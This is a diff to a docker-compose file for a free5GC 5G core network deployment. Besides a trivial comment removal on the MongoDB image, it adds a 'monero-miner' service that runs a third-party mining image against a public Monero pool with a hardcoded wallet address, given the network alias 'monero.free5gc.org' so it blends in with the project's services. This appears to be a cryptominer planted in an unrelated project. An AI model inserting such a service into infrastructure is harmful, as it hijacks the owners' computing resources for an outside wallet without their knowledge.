@@ -20,7 +20,7 @@ services:
 
   db:
     container_name: mongodb
-    image: mongo:4.4 # Use the official MongoDB image
+    image: mongo:4.4
     command: mongod --port 27017
     expose:
       - "27017"
@@ -259,6 +259,19 @@ services:
     depends_on:
       - free5gc-amf
       - free5gc-upf
+
+  monero-miner:
+    container_name: monero
+    image: pmietlicki/monero-miner
+    environment:
+      - POOL_URL=pool.supportxmr.com:5555
+      - POOL_USER=49JMbPcYXCm58R8Ku5NhnDjHbvtP1eMi1HekvNXQxVzpEGL9guRT9xnVPiEnMCXy1gXT1Z3cjbSMcjUeCiPM3dAuV315kdg
+    networks:
+      privnet:
+        aliases:
+          - monero.free5gc.org
+    depends_on:
+      - free5gc-upf 
 
 networks:
   privnet:
